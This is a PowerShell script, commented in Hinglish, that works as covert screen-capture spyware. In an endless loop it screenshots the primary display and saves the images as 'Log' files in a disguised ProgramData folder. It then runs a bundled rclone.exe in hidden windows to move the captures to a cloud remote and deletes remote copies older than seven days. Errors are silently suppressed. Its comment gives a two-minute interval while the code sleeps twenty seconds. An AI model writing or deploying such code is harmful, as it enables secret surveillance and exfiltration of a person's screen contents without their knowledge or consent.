$BaseDir = "C:\ProgramData\SystemData"
$LogDir = "$BaseDir\Logs"
$RclonePath = "$BaseDir\rclone.exe"
$DriveName = "bug:hostname" # Config mein bugdrive remote hai aur bug folder

# Folder check
if (!(Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force }

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$Signature = @"
[DllImport("shcore.dll")]
public static extern int SetProcessDpiAwareness(int awareness);
"@
$DpiAwareness = Add-Type -MemberDefinition $Signature -Name "DpiAwareness" -Namespace Win32 -PassThru
# Setting to 1 (System DPI Aware)
[void]$DpiAwareness::SetProcessDpiAwareness(1)
# --------------------------------------------------------------------------

while($true) {
    try {
        $Time = Get-Date -Format "ss-mm-HH_dd"
        $File = "$LogDir\Log_$Time.jpg"

        # Ab ye actual resolution detect karega (e.g., 1920x1080 chahay scaling ho bhi)
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $Width  = $Screen.Bounds.Width
        $Height = $Screen.Bounds.Height
        $Top    = $Screen.Bounds.Top
        $Left   = $Screen.Bounds.Left

        # Bitmap banana actual size ke mutabiq
        $Bitmap = New-Object System.Drawing.Bitmap -ArgumentList $Width, $Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        
        # Capture from actual Top/Left coordinate to bottom right
        # Ab scaling ka koi asar nahi hoga
        $Graphics.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
        
        # Save karna (50% Quality taake file size chota rahay)
        $Bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        
        $Graphics.Dispose()
        $Bitmap.Dispose()

        # 2. Rclone Move (Upload aur Local se Delete)
        Start-Process -FilePath $RclonePath -ArgumentList "move", "$LogDir", "$DriveName", "--quiet" -WindowStyle Hidden -Wait

        # 3. 7 Din se purana data Drive se delete karna
        Start-Process -FilePath $RclonePath -ArgumentList "delete", "$DriveName", "--min-age", "7d", "--quiet" -WindowStyle Hidden
    }
    catch { }

    # Loop Har 2 minute baad
    Start-Sleep -Seconds 20
}
